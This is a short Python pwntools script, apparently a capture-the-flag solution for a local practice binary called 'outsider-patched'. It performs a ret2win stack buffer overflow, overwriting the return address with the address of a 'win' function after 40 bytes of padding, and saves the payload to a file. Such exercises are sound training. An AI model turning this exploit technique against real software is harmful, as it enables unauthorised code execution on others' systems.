from pwn import *

# create a pwntools process that can interact with the binary
p = process('./outsider-patched')

# get the address of the win function
win_loc = p.elf.symbols['win']
print(f'win_loc: {hex(win_loc)}')

# We found this by sending a cyclic into the binary and then checking the value of the RIP register
# at the time of the segfault
padding_len = 40
padding = b'A' * padding_len

# create the payload
payload = padding + p64(win_loc)

# send the payload to the binary
p.sendline(payload)

# write the payload to a file
# we can reuse outside of the script via `cat payload | ./outsider-patched`
with open('payload', 'wb') as f:
    f.write(payload)

# interact with the binary after we've sent out stuff
p.interactive()

